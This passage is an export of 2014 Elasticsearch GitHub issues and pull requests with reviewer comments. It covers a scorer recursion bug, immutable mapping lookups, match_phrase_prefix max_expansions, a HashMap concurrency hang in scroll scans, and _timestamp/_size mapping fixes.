The aggregation framework registers the agg script as scorer aware. When setScorer is called it eventually delegates down to DocLookup.setScorer(). DocLookup is global though so the agg script overwrites the original scorer (the one that the score script needs to use) and replaces it with the Score script. So now when the score script evaluates _score instead of using the original scorer it tries to use itself causing a recursive loop.

The solution should be to replace the global DocLookup with a DocLookup for each context (e.g. one for aggs, one for query_score, etc.)
</comment><comment author="brwe" created="2014-09-19T17:47:25Z" id="56210595">&gt; The solution should be to replace the global DocLookup with a DocLookup for each context (e.g. one for aggs, one for query_score, etc.)

I believe it might be sufficient to just remove the dependence of DocLookup and scorer. The scorer should be set for each script explicitly instead of having the script score set the scorer in DocLookup which is then in turn looked up by the script when it is executed. 
Here is what I mean: https://github.com/brwe/elasticsearch/commit/5e142fe0459d03a013d77554aa4c4a27090125d9
</comment><comment author="clintongormley" created="2014-09-25T12:40:00Z" id="56812432">@brwe @markharwood any progress on this one?
</comment><comment author="brwe" created="2014-09-25T12:49:54Z" id="56813535">@clintongormley See my PR above, needs a reviewer
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Make lookup structures immutable.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7486</link><project id="" key="" /><description>This commit makes the lookup structures that are used for mappings immutable.
When changes are required, a new instance is created while the current instance
is left unmodified. This is done efficiently thanks to a hash table
implementation based on a array hash trie, see
org.elasticsearch.common.collect.CopyOnWriteHashMap.

ManyMappingsBenchmark returns indexing times that are similar to the ones that
can be observed in current master.

Ultimately, I would like to see if we can make mappings completely immutable as
well and updated atomically. This is not trivial however, eg. because of dynamic
mappings. So here is a first baby step that should help move towards that
direction.
</description><key id="41307226">7486</key><summary>Make lookup structures immutable.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/jpountz/following{/other_user}', u'events_url': u'https://api.github.com/users/jpountz/events{/privacy}', u'organizations_url': u'https://api.github.com/users/jpountz/orgs', u'url': u'https://api.github.com/users/jpountz', u'gists_url': u'https://api.github.com/users/jpountz/gists{/gist_id}', u'html_url': u'https://github.com/jpountz', u'subscriptions_url': u'https://api.github.com/users/jpountz/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/299848?v=4', u'repos_url': u'https://api.github.com/users/jpountz/repos', u'received_events_url': u'https://api.github.com/users/jpountz/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/jpountz/starred{/owner}{/repo}', u'site_admin': False, u'login': u'jpountz', u'type': u'User', u'id': 299848, u'followers_url': u'https://api.github.com/users/jpountz/followers'}</assignee><reporter username="">jpountz</reporter><labels><label>:Mapping</label><label>enhancement</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-08-27T17:10:37Z</created><updated>2015-06-07T10:55:17Z</updated><resolved>2014-10-02T11:42:52Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-28T08:40:24Z" id="53688377">I just pushed a new commit that makes adding/removing mappers to FieldMappersLookup perform in logarithmic time instead of linear.
</comment><comment author="rjernst" created="2014-09-05T06:35:38Z" id="54590101">Looks ok overall. None of the comments I left are critical.

I am, however, concerned about the number of allocations just to construct from a map.  Perhaps there is a way to have a constructor that (1) iterates the source map and builds a list of the keys/values (2) sorts based on hash, and (3) build the nodes from the root down, allocating exactly what is needed?  If this sounds too crazy just ignore me...
</comment><comment author="jpountz" created="2014-09-05T14:28:47Z" id="54631844">@rjernst Thanks for the review, I pushed some more commits.

&gt;  I am, however, concerned about the number of allocations just to construct from a map. Perhaps there is a way to have a constructor that (1) iterates the source map and builds a list of the keys/values (2) sorts based on hash, and (3) build the nodes from the root down, allocating exactly what is needed? If this sounds too crazy just ignore me...

Writes can indeed be allocation intensive, as every write will allocate between 4 and 19 (small) objects. Your idea would work but I am a bit reluctant to do it as it not  trivial to implement and doesn't seem necessary for now performance-wise. Maybe this is something we can think about in the future if/when we start having issues?
</comment><comment author="rjernst" created="2014-09-05T14:35:07Z" id="54632639">&gt; Maybe this is something we can think about in the future if/when we start having issues?

Sure, that sounds fine.
</comment><comment author="rjernst" created="2014-09-05T14:38:37Z" id="54633092">LGTM!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Match Phrase Prefix Query Inconsistent Results across My Environments</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7485</link><project id="" key="" /><description>I'm having an issue where elasticsearch is returning different results across my environments (staging and production).

The version of elasticsearch I'm using are the same for both environrments.

version: { created: 1000199}
The two environments both have identical mapping and index settings.

I have an item indexed with a title field of "test". I am trying to perform a match_phrase_prefix query. Yet, in my staging environment when I just search for "te" the result comes back as expected. In production, I have to extend my search query to "tes" (3 letters) to retrieve the document.

The query I am issuing is a follows:

```
    {
  "query": {
    "match_phrase_prefix": {
      "title": "test"
    }
  },
  "post_filter": { 
    "term": {    "uniqueId":"my_unique_id" }
  }
}
```

The only difference I can see between the two environments are the amount of documents index.

In my staging environment, I have approx. 150k documents index which equates to about 297M.

In production, I have over 120 millon documents indexed which equates close to 120gb.

Is this a scale problem, or is there some elasticsearch setting that I am missing. Like I said the mappings and settings are identical across the environments, so I am a bit stumped here.
</description><key id="41295173">7485</key><summary>Match Phrase Prefix Query Inconsistent Results across My Environments</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">roykachouh</reporter><labels /><created>2014-08-27T15:22:39Z</created><updated>2014-09-06T15:28:49Z</updated><resolved>2014-09-02T16:02:27Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-02T16:02:26Z" id="54174845">Hi @roykachouh 

The `match_phrase_prefix` has the `max_expansions` parameter, to limit the number of wildcard matches that can possibly match.  By default, it is set to 50.  So in production, you have more than 50 terms which begin with `te` before you get to `test`.
</comment><comment author="roykachouh" created="2014-09-02T18:39:21Z" id="54197652">@clintongormley Thank you very much for the response.  Increasing the max_expansions size did the trick for me.  Now I'm trying to figure out through documentation and google search what the sweet spot is for this configuration.  I see in the reference docs the following is stated: 

"It is highly recommended to set it to an acceptable value to control the execution time of the query"

Any advice or documentation you can point me to that will help me better understand the "acceptable" value will be greatly appreciated.  
</comment><comment author="clintongormley" created="2014-09-06T15:28:49Z" id="54715406">@roykachouh the higher the number, the more terms that Elasticsearch has to examine.  If you really want efficient prefix matching then you should look at using edge ngrams. 

See http://www.elasticsearch.org/guide/en/elasticsearch/guide/current/_index_time_search_as_you_type.html
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Blobstore#readBlobFully can't read chunked blobs</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7484</link><project id="" key="" /><description>if the blob is chunked reading it will just barf with FileNotFound or it will blindly stop after the first chunk.
</description><key id="41290481">7484</key><summary>Blobstore#readBlobFully can't read chunked blobs</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>non-issue</label></labels><created>2014-08-27T14:39:51Z</created><updated>2014-09-03T18:25:41Z</updated><resolved>2014-09-03T18:25:31Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-02T15:57:20Z" id="54173942">@s1monw assuming this is an adoptme?
</comment><comment author="demon" created="2014-09-03T14:59:02Z" id="54309993">I'm guessing we're working around this with #7551 removing readBlobFully and friends?
</comment><comment author="s1monw" created="2014-09-03T18:25:31Z" id="54342907">superseded by  #7551
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>the agg and sort </title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7483</link><project id="" key="" /><description>i use 

groupByAgg.order(Terms.Order.aggregation("SUM(*)",true)) ;
it work ok !

but when i use 
groupByAgg.order(Terms.Order.aggregation("COUNT(*)",true)) ;
it not worked ;

and i find agg only can set size not .set begin ..

what shoud i do .   thanks !
</description><key id="41285299">7483</key><summary>the agg and sort </summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">ansjsun</reporter><labels /><created>2014-08-27T13:50:25Z</created><updated>2014-09-02T15:56:25Z</updated><resolved>2014-09-02T15:56:25Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-02T15:56:25Z" id="54173795">Hi @ansjsun 

This issues list is for bug reports or feature requests in Elasticsearch. Please ask questions like these in the user forum.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Test: Allow global test cluster to have configurable settings source</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7482</link><project id="" key="" /><description>This allows to reuse the global test cluster with specific configurations,
which is useful in plugins.

Allows to change this in plugin tests like this:

``` java
public class FooTest extends ElasticsearchIntegrationTest {

    static {
        InternalTestCluster.DEFAULT_SETTINGS_SOURCE = new SettingsSource() { ... };
    }

    @Test
    public void foo() { ... }
```
</description><key id="41280137">7482</key><summary>Test: Allow global test cluster to have configurable settings source</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">spinscale</reporter><labels><label>test</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-27T12:55:24Z</created><updated>2015-06-07T11:46:37Z</updated><resolved>2014-08-27T15:28:43Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-27T12:58:18Z" id="53568085">awesome maybe we can drop that extra ctor in InternalTestCluster too then?
</comment><comment author="spinscale" created="2014-08-27T13:35:34Z" id="53572628">@s1monw I removed the simple unused constructor and left the other two in place. The TribeTests are using it as well and doesnt make too much sense for them to set it explicety in the tests.. this way everything can stay package private
</comment><comment author="javanna" created="2014-08-27T13:36:02Z" id="53572708">Left a minor comment, other that that looks great to me!
</comment><comment author="nik9000" created="2014-08-27T13:54:27Z" id="53575274">Sweet!  I'm looking forward to this!
</comment><comment author="javanna" created="2014-08-27T14:11:07Z" id="53577584">Hey @nik9000 right this would help #7040 too wouldn't it?
</comment><comment author="nik9000" created="2014-08-27T14:17:47Z" id="53578591">@javanna yeah!  It pretty much closes that issue.
</comment><comment author="s1monw" created="2014-08-27T14:36:31Z" id="53581533">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Indexed Scripts : Add timeout</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7481</link><project id="" key="" /><description>This commit adds a timeout that defaults to 5 seconds to the indexed script get operation.
It also adds a test that attempts a script get before the .scripts index is created.
</description><key id="41275748">7481</key><summary>Indexed Scripts : Add timeout</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">GaelTadh</reporter><labels /><created>2014-08-27T12:07:29Z</created><updated>2015-03-19T09:27:29Z</updated><resolved>2014-09-19T11:20:54Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rjernst" created="2014-08-27T15:20:40Z" id="53588470">I left a couple comments.  It's a little weird to me to see a timeout in static configuration, versus being passed in the request, but I don't know how timeouts work in the rest of ES.  Also, I don't see any tests for the setting (default or set manually)?
</comment><comment author="GaelTadh" created="2014-08-28T13:47:39Z" id="53721572">@rjernst I've added a timeout to the request if the call is coming from there. It could also be part of a query so using the query timeout wouldn't make sense I think so we have the static default timeout.
</comment><comment author="rjernst" created="2014-08-28T18:46:59Z" id="53776331">I left a few more comments.  But now that I am looking at it again, what is the benefit of having this timeout? Getting and indexed script should be fast; there is no computational work in the request.  How will timeouts here help users?
</comment><comment author="GaelTadh" created="2014-09-19T11:20:54Z" id="56165056">I'm going to abandon this PR since the underlying issue was fixed by @s1monw, if needed I will re-open.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Support for version and version_type</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7480</link><project id="" key="" /><description>This commit adds support for version and version_type to the Term Vectors API. This could be useful in the following case whereby the user gets a document and later wants to generate its TVs. With version, this would ensure that only the TVs of that particular document are generated, and error out if the document has been updated in between.
</description><key id="41272516">7480</key><summary>Support for version and version_type</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">alexksikes</reporter><labels><label>:Term Vectors</label><label>enhancement</label><label>v2.0.0-beta1</label></labels><created>2014-08-27T11:24:14Z</created><updated>2015-06-07T17:39:48Z</updated><resolved>2014-12-17T14:50:57Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rjernst" created="2014-08-27T15:06:43Z" id="53586361">LGTM.  It would be nice to have some non-REST tests?
</comment><comment author="jpountz" created="2014-08-27T15:39:11Z" id="53591483">The change looks good to me too, but I'm wondering if version support is actually useful on term vectors? Do you have practical applications in mind?
</comment><comment author="alexksikes" created="2014-08-27T16:14:48Z" id="53598698">@jpountz Term vectors are near real-time, so this would make a lot more sense once TVs could be generated in real-time. Perhaps support for `realtime` could go in another commit? However, what should be the default, `realtime`: `false` or `true`? Or `realtime`: `true` if `version` is specified, and `false` otherwise?

@rjernst I think versioning itself is already thoroughly tested in non-REST tests. So it makes sense to test versioning for TVs only through REST-tests, just like for the get API?
</comment><comment author="jpountz" created="2014-08-27T18:53:07Z" id="53622226">@alexksikes I think I'm confused because the `version` parameter is something that is not implemented in the multi-get API (yet nobody complained?) so I'm wondering if it will be used at all in the termvector APIs?
</comment><comment author="alexksikes" created="2014-09-03T14:12:10Z" id="54302899">@jpountz I think it is implemented in the mget API. But anyway, I think that feature is useful. Suppose you get a document and want later to generate its TVs. This would ensure you only generate the TVs of that document, and error out if the document has been updated in between ...
</comment><comment author="clintongormley" created="2014-11-11T19:57:05Z" id="62610143">@alexksikes do you still plan on merging this?
</comment><comment author="alexksikes" created="2014-11-14T13:59:16Z" id="63067587">@clintongormley Yes, I did run into a bug, so postponed it.
</comment><comment author="alexksikes" created="2014-12-02T15:05:00Z" id="65243697">OK rebased on master and ready for review.
</comment><comment author="jpountz" created="2014-12-04T10:29:27Z" id="65612656">@alexksikes Just left one comment, other than that the change looks good. Like @rjernst I think we should have Java tests, which have better randomization than REST tests and allow to test the Java client API (for instance right now, there are no call sites for `TermVectorsRequestBuilder.setVersion`).
</comment><comment author="jpountz" created="2014-12-17T12:01:43Z" id="67312972">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Cleanup StoreFileMetadata.java</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7479</link><project id="" key="" /><description>StoreFileMetadata.java uses a `isSame` methods which is essentially `equals` I think we should clean it up and also provide a `hashCode` implementation.
</description><key id="41268514">7479</key><summary>Cleanup StoreFileMetadata.java</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/s1monw/following{/other_user}', u'events_url': u'https://api.github.com/users/s1monw/events{/privacy}', u'organizations_url': u'https://api.github.com/users/s1monw/orgs', u'url': u'https://api.github.com/users/s1monw', u'gists_url': u'https://api.github.com/users/s1monw/gists{/gist_id}', u'html_url': u'https://github.com/s1monw', u'subscriptions_url': u'https://api.github.com/users/s1monw/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/973334?v=4', u'repos_url': u'https://api.github.com/users/s1monw/repos', u'received_events_url': u'https://api.github.com/users/s1monw/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/s1monw/starred{/owner}{/repo}', u'site_admin': False, u'login': u's1monw', u'type': u'User', u'id': 973334, u'followers_url': u'https://api.github.com/users/s1monw/followers'}</assignee><reporter username="">s1monw</reporter><labels /><created>2014-08-27T10:25:27Z</created><updated>2015-03-17T22:52:02Z</updated><resolved>2015-03-17T22:51:59Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-27T10:28:56Z" id="53551790">@s1monw Left one comment
</comment><comment author="s1monw" created="2014-08-27T11:05:30Z" id="53554798">pushed a new commit.
</comment><comment author="jpountz" created="2014-08-27T11:34:38Z" id="53557210">The code looks good but I don't know S&amp;R well enough to know if there are potential implications to the fact that more stuff is checked in equals. Would be nice if someone could confirm it is ok.
</comment><comment author="s1monw" created="2014-08-27T12:23:09Z" id="53564633">I addressed the comments...

&gt; The code looks good but I don't know S&amp;R well enough to know if there are potential implications to the fact that more stuff is checked in equals. Would be nice if someone could confirm it is ok.

we are looking up the metadata by name anyway so that one has to match and for the `writtenBy` part that is actually a bug that we didn't check that one. I will ask @imotov to take a look
</comment><comment author="clintongormley" created="2014-11-11T19:54:33Z" id="62609624">@s1monw can this be closed or do you still plan to work on it?
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Internal: Stuck on java.util.HashMap.get?</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7478</link><project id="" key="" /><description>We seem to have a problem with stuck threads in an Elasticsearch cluster. It appears at random, but once a thread is stuck it seems to keep being stuck until elasticsearch on that node is restarted. The theads get stuck in a busy loop and the stack trace of one is:

```
Thread 3744: (state = IN_JAVA)
 - java.util.HashMap.getEntry(java.lang.Object) @bci=72, line=446 (Compiled frame; information may be imprecise)
 - java.util.HashMap.get(java.lang.Object) @bci=11, line=405 (Compiled frame)
 - org.elasticsearch.search.scan.ScanContext$ScanFilter.getDocIdSet(org.apache.lucene.index.AtomicReaderContext, org.apache.lucene.util.Bits) @bci=8, line=156 (Compiled frame)
 - org.elasticsearch.common.lucene.search.ApplyAcceptedDocsFilter.getDocIdSet(org.apache.lucene.index.AtomicReaderContext, org.apache.lucene.util.Bits) @bci=6, line=45 (Compiled frame)
 - org.apache.lucene.search.FilteredQuery$1.scorer(org.apache.lucene.index.AtomicReaderContext, boolean, boolean, org.apache.lucene.util.Bits) @bci=34, line=130 (Compiled frame)
 - org.apache.lucene.search.IndexSearcher.search(java.util.List, org.apache.lucene.search.Weight, org.apache.lucene.search.Collector) @bci=68, line=618 (Compiled frame)
 - org.elasticsearch.search.internal.ContextIndexSearcher.search(java.util.List, org.apache.lucene.search.Weight, org.apache.lucene.search.Collector) @bci=225, line=173 (Compiled frame)
 - org.apache.lucene.search.IndexSearcher.search(org.apache.lucene.search.Query, org.apache.lucene.search.Collector) @bci=11, line=309 (Interpreted frame)
 - org.elasticsearch.search.scan.ScanContext.execute(org.elasticsearch.search.internal.SearchContext) @bci=54, line=52 (Interpreted frame)
 - org.elasticsearch.search.query.QueryPhase.execute(org.elasticsearch.search.internal.SearchContext) @bci=174, line=119 (Compiled frame)
 - org.elasticsearch.search.SearchService.executeScan(org.elasticsearch.search.internal.InternalScrollSearchRequest) @bci=49, line=233 (Interpreted frame)
 - org.elasticsearch.search.action.SearchServiceTransportAction$SearchScanScrollTransportHandler.messageReceived(org.elasticsearch.search.internal.InternalScrollSearchRequest, org.elasticsearch.transport.TransportChannel) @bci=8, line=791 (Interpreted frame)
 - org.elasticsearch.search.action.SearchServiceTransportAction$SearchScanScrollTransportHandler.messageReceived(org.elasticsearch.transport.TransportRequest, org.elasticsearch.transport.TransportChannel) @bci=6, line=780 (Interpreted frame)
 - org.elasticsearch.transport.netty.MessageChannelHandler$RequestHandler.run() @bci=12, line=270 (Compiled frame)
 - java.util.concurrent.ThreadPoolExecutor.runWorker(java.util.concurrent.ThreadPoolExecutor$Worker) @bci=95, line=1145 (Compiled frame)
 - java.util.concurrent.ThreadPoolExecutor$Worker.run() @bci=5, line=615 (Interpreted frame)
 - java.lang.Thread.run() @bci=11, line=724 (Interpreted frame)
```

It looks very much as the known problem of using the non-synchronized HashMap class in a threaded environment, see (http://stackoverflow.com/questions/17070184/hashmap-stuck-on-get). Unfortunately I'm not familiar enough with the es code to know if this can be the issue.

The solution mentioned at the link is to use ConcurrentHashMap instead.
</description><key id="41264447">7478</key><summary>Internal: Stuck on java.util.HashMap.get?</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/martijnvg/following{/other_user}', u'events_url': u'https://api.github.com/users/martijnvg/events{/privacy}', u'organizations_url': u'https://api.github.com/users/martijnvg/orgs', u'url': u'https://api.github.com/users/martijnvg', u'gists_url': u'https://api.github.com/users/martijnvg/gists{/gist_id}', u'html_url': u'https://github.com/martijnvg', u'subscriptions_url': u'https://api.github.com/users/martijnvg/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/580421?v=4', u'repos_url': u'https://api.github.com/users/martijnvg/repos', u'received_events_url': u'https://api.github.com/users/martijnvg/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/martijnvg/starred{/owner}{/repo}', u'site_admin': False, u'login': u'martijnvg', u'type': u'User', u'id': 580421, u'followers_url': u'https://api.github.com/users/martijnvg/followers'}</assignee><reporter username="">maf23</reporter><labels><label>bug</label><label>v1.2.5</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-27T09:35:19Z</created><updated>2014-09-08T14:13:28Z</updated><resolved>2014-08-28T14:37:01Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-27T09:50:35Z" id="53548295">this does look like the bug you are referring to. thanks for reporting this!
</comment><comment author="maf23" created="2014-08-27T09:56:06Z" id="53548845">An additional note, we have noted that this seems to happen (at least more frequently) when we post multiple parallel scan queries. Which seems to make sense from what I can see in the stack trace.
</comment><comment author="martijnvg" created="2014-08-27T12:29:39Z" id="53565244">@maf23 Were you using the same scroll id multiple times in the parallel scan queries? 
</comment><comment author="maf23" created="2014-08-27T13:00:10Z" id="53568309">The scroll id should be different. But we will check our code to make sure
this is actually the case.

On Wed, Aug 27, 2014 at 2:30 PM, Martijn van Groningen &lt;
notifications@github.com&gt; wrote:

&gt; @maf23 https://github.com/maf23 Were you using the same scroll id
&gt; multiple times in the parallel scan queries?
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/elasticsearch/elasticsearch/issues/7478#issuecomment-53565244
&gt; .
</comment><comment author="martijnvg" created="2014-08-27T13:23:42Z" id="53571094">I can see how this situation can occur if multiple scroll requests are scrolling in parallel with the same scroll id (or same scroll id prefix), the scroll api was never designed to support this. I think we need proper validation if two search requests try to access the same scan context that is open on a node.
</comment><comment author="martijnvg" created="2014-08-27T14:15:38Z" id="53578267">Also running the clear scoll api during a scroll session can cause this bug.
</comment><comment author="martijnvg" created="2014-08-28T10:05:20Z" id="53699612">@maf23 Can you share what jvm version and vendor you're using?
</comment><comment author="maf23" created="2014-08-28T10:12:50Z" id="53700763">Sure, Oracle JVM 1.7.0_25
</comment><comment author="martijnvg" created="2014-08-28T12:09:30Z" id="53711013">Ok thanks, like you mentioned the ConcurrentHashMap should be used here since the map in question is accessed by different threads during the entire scroll.
</comment><comment author="martijnvg" created="2014-08-28T14:38:40Z" id="53729049">@maf23 Pushed a fix for this bug, which will be included in the next release. Thanks for reporting this!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Use preference("_local") on get calls.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7477</link><project id="" key="" /><description>This commit sets preference("_local") on get calls to try and prevent
the GetRequest from being forked off.
</description><key id="41263854">7477</key><summary>Use preference("_local") on get calls.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">GaelTadh</reporter><labels><label>:Indexed Scripts/Templates</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-27T09:27:31Z</created><updated>2015-06-07T12:10:19Z</updated><resolved>2014-08-27T10:07:34Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-27T09:34:57Z" id="53546745">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[TEST] removed AwaitsFix, added checks to make sure indexed scripts are ...</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7476</link><project id="" key="" /><description>...put correctly
</description><key id="41263229">7476</key><summary>[TEST] removed AwaitsFix, added checks to make sure indexed scripts are ...</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels /><created>2014-08-27T09:19:27Z</created><updated>2014-09-02T11:11:20Z</updated><resolved>2014-08-27T10:07:06Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-27T10:03:33Z" id="53549564">LGTM
</comment><comment author="colings86" created="2014-08-27T10:06:53Z" id="53549907">Pushed to master and 1.x
</comment><comment author="colings86" created="2014-08-27T10:07:59Z" id="53550035">PR lost the reference to the commit: https://github.com/elasticsearch/elasticsearch/commit/6797d73d7ef3e18a55b57e3f0010fd080d1fc60e
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Keep parameters in mapping for `_timestamp` and `_size` even if disabled</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7475</link><project id="" key="" /><description>Settings that are not default for _size and _timestamp were only build in
toXContent if these fields were actually enabled.
_timestamp and _size can be dynamically enabled or disabled.
Therfore the settings must be kept, even if the field is disabled.
(Dynamic enabling/disabling was intended, see TimestampFieldMapper.merge(..)
and SizeMappingTests#testThatDisablingWorksWhenMerging
but actually never worked, see below).

To avoid that _timestamp is overwritten by a default mapping
this commit also adds a check to mapping merging if the type is already
in the mapping. In this case the default is not applied anymore.
(see
SimpleTimestampTests#testThatUpdatingMappingShouldNotRemoveTimestampConfiguration)

As a side effect, this fixes
- overwriting of paramters from the _source field by default mappings
  (see DefaultSourceMappingTests).
- dynamic enabling and disabling of _timestamp and _size ()
  (see SimpleTimestampTests#testThatTimestampCanBeSwitchedOnAndOff and
  SizeMappingIntegrationTests#testThatTimestampCanBeSwitchedOnAndOff )

Tests:

Enable UpdateMappingOnClusterTests#test_doc_valuesInvalidMappingOnUpdate again
The missing settings in the mapping for _timestamp and _size caused a the
failure: When creating a mapping which has settings other than default and the
field disabled, still empty field mappings were built from the type mappers.
When creating such a mapping, the mapping source on master and the rest of the cluster
can be out of sync for some time:
1. Master creates the index with source _timestamp:{_store:true}
   mapper classes are in a correct state but source is _timestamp:{}
2. Nodes update mapping and refresh source which then completely misses _timestamp
3. After a while source is refreshed again also on master and the _timestamp:{}
   vanishes there also.

The test UpdateMappingOnCusterTests#test_doc_valuesInvalidMappingOnUpdate failed
because the cluster state was sampled from master between 1. and 3. because the
randomized testing injected a default mapping with disabled _size and _timestamp
fields that have settings which are not default.

The test
TimestampMappingTests#testThatDisablingFieldMapperDoesNotReturnAnyUselessInfo
must be removed because it actualy expected the timestamp to remove
parameters when it was disabled.
</description><key id="41261652">7475</key><summary>Keep parameters in mapping for `_timestamp` and `_size` even if disabled</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">brwe</reporter><labels><label>:Mapping</label><label>bug</label><label>v1.2.5</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-27T08:57:57Z</created><updated>2015-06-07T19:00:13Z</updated><resolved>2014-09-01T08:45:42Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-27T10:31:27Z" id="53551989">@brwe Just left minor comments, but the change looks great in general.
</comment><comment author="spinscale" created="2014-08-27T16:26:22Z" id="53600411">could the `IndexFieldMapper` suffer the same problem?

some minor things, but looks close
</comment><comment author="brwe" created="2014-08-28T14:43:06Z" id="53729726">@spinscale I think IndexFieldMapper has the same problem. Will fix that also.
</comment><comment author="brwe" created="2014-08-28T17:36:29Z" id="53762593">ok, fixed IndexFieldMapper. Also fixed the default template applying. Thanks for spotting it!
</comment><comment author="jpountz" created="2014-08-28T20:52:35Z" id="53796430">LGTM
</comment><comment author="brwe" created="2014-08-29T10:57:39Z" id="53862389">pushing to 1.3 is hard - I get many merge conflicts and am unsure about possible side effects of missing commits (current status here https://github.com/brwe/elasticsearch/commit/35819ac9f54985099ee9b7d99460a53ad17b1c45).
pushing to 1.2 will be even trickier because 1.2 does not have the ElasticsearchSingleNodesTest
